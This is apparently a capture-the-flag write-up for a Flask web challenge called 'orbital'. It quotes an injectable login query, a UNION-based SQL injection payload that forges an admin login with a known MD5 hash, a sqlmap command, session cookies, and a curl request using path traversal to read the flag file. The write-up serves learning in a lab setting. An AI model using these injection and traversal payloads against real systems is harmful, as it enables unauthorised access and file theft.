# orbital

**SOLVED**

> In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. 
> Can you get your hands on the decoder?

`./build-docker.sh`

Dockerfile -> mariadb, flask, jwt

```dockerfile
# Dockerfile
COPY flag.txt /signal_sleuth_firmware
```

```py
user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)
```

```sql
" UNION SELECT username, 'password' FROM users WHERE username="admin

SELECT username, password FROM users WHERE username = "" UNION SELECT username, 'password' AS password FROM users WHERE username="admin"
```

```sh
python3 /opt/sqlmap/sqlmap.py -u 'http://0.0.0.0:1337/api/login' --level 5 --risk 3 -f --banner --ignore-code 401 --dbms='mysql'
```

password
5f4dcc3b5aa765d61d8327deb882cf99

```sql
" UNION SELECT username, '5f4dcc3b5aa765d61d8327deb882cf99' AS password FROM users WHERE username="admin
```

eyJhdXRoIjoiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFjMlZ5Ym1GdFpTSTZJbUZrYldsdUlpd2laWGh3SWpveE5qYzVNams0TmpVd2ZRLjlpRUQ5b1JWa0NsbUR6UnRMbHhMRGkzbnlxZE82MEtBcVVfcWctRThEMjAifQ.ZBe7-g.hb_Nu6raq5V-1Jz2jqis39i6eCg

```sh
# eyJhdXRoIjoiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFjMlZ5Ym1GdFpTSTZJbUZrYldsdUlpd2laWGh3SWpveE5qYzVNams0TnpVMGZRLmNVeHFNT2VVbmlteHUydHZBbWQ4MVdYN0xaZUF1OWh2SWFySkh4dmExMHMifQ.ZBe8Yg.JgjCEky4dnIhvZ7TOYX4aVPoaQM

curl 'http://localhost:1337/api/export' \
  -X POST \
  -H 'content-type: application/json' \
  -H 'Cookie: session=eyJhdXRoIjoiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFjMlZ5Ym1GdFpTSTZJbUZrYldsdUlpd2laWGh3SWpveE5qYzVNams0TnpVMGZRLmNVeHFNT2VVbmlteHUydHZBbWQ4MVdYN0xaZUF1OWh2SWFySkh4dmExMHMifQ.ZBe8Yg.JgjCEky4dnIhvZ7TOYX4aVPoaQM' \
  --data '{
    "name":"../signal_sleuth_firmware/flag.txt"
  }'
```